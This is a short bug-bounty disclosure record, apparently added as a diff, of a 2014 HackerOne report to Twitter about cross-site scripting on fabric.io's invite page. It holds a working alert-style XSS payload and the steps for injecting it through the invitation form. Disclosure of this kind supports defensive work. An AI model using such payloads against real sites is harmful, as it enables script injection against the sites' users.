@@ -1,0 +1,17 @@
+ReportLink:https://hackerone.com/reports/32519
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/atom
+ReportedTo:Twitter(twitter)
+BountyAmount:280.0
+Severity:
+State:Closed
+DateOfDisclosure:23.12.2014 15:56:03
+
+Summary:
+
+Proof: http://i.imgur.com/Hk84G3Y.png
+
+Vulnerable Page: https://fabric.io/onboard/invite
+Put this code: "><img src=x onerror=alert(document.domain)>
+and email
+then send invitation
